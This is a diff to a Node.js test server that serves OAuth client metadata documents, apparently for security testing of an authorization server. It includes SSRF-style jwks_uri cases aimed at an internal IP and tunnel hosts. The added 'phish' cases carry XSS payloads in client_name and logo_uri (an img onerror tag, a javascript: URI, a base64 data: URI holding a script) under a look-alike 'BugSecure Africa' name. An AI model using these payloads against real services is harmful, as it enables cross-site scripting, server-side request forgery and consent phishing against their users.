@@ -3,7 +3,7 @@
 const http = require("http");
 const fs = require("fs");
 const crypto = require("crypto");
-const PORT = 8099;
+const PORT = Number(process.env.PORT || 8099);
 const LOG = "/tmp/opencode/jwks-listener.log";
 const log = (s) => { console.log(s); try { fs.appendFileSync(LOG, s + "\n"); } catch {} };
 
@@ -23,7 +23,8 @@ const server = http.createServer((req, res) => {
 
   if (u.pathname.startsWith("/doc/")) {
     const host = (req.headers.host || "").replace(/:\d+$/, "");
-    const proto = String(req.headers.host || "").includes("lhr.life") || String(req.headers.host || "").includes("trycloudflare.com") || String(req.headers.host || "").includes("ngrok-free.app") ? "https" : (req.socket.encrypted ? "https" : "http");
+    const fwd = String(req.headers["x-forwarded-proto"] || "").split(",")[0].trim();
+    const proto = fwd ? fwd : (String(req.headers.host || "").includes("lhr.life") || String(req.headers.host || "").includes("trycloudflare.com") || String(req.headers.host || "").includes("ngrok-free.app") ? "https" : (req.socket.encrypted ? "https" : "http"));
     const cid = `${proto}://${host}${u.pathname}`;
     const doc = {
       client_id: cid,
@@ -45,14 +46,30 @@ const server = http.createServer((req, res) => {
       "/doc/jwks-private.json": "http://10.255.255.1/jwks.json",
       "/doc/jwks-pk.json": "__TUN__/jwks.json",
       "/doc/pk-nojwks.json": null,
+      "/doc/phish1.json": null,
+      "/doc/phish2.json": null,
+      "/doc/phish3.json": null,
     };
     let jwksUri = Object.prototype.hasOwnProperty.call(CASES, u.pathname) ? CASES[u.pathname] : undefined;
     if (jwksUri === undefined) jwksUri = u.searchParams.get("jwks");
     if (jwksUri) doc.jwks_uri = jwksUri.replace("__TUN__", `https://${host}`);
     if (u.pathname === "/doc/jwks-private-key.json" || u.pathname === "/doc/jwks-pk.json" || u.pathname === "/doc/pk-nojwks.json") doc.token_endpoint_auth_method = "private_key_jwt";
+    // --- test de rendu de la page de consentement (Kimi §2) ---
+    if (u.pathname === "/doc/phish1.json") {
+      doc.client_name = "BugSecure Africa <b>CONNEXION</b> SÉCURISÉE <img src=x onerror=alert(1)>";
+      doc.logo_uri = `https://${host}/logo.svg`;
+    }
+    if (u.pathname === "/doc/phish2.json") { doc.client_name = "BugSecure Africa - Connexion securisee"; doc.logo_uri = "javascript:alert(document.domain)"; }
+    if (u.pathname === "/doc/phish3.json") { doc.client_name = "BugSecure Africa"; doc.logo_uri = "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="; }
     const body = JSON.stringify(doc);
     res.writeHead(200, { "Content-Type": "application/json", "Content-Length": Buffer.byteLength(body) });
     res.end(body);
+    return;
+  }
+  if (u.pathname === "/logo.svg") {
+    const svg = `<svg xmlns="http://www.w3.org/2000/svg" width="120" height="120"><rect width="120" height="120" fill="#0b3"/></svg>`;
+    res.writeHead(200, { "Content-Type": "image/svg+xml" });
+    res.end(svg);
     return;
   }
   if (u.pathname === "/jwks.json") {
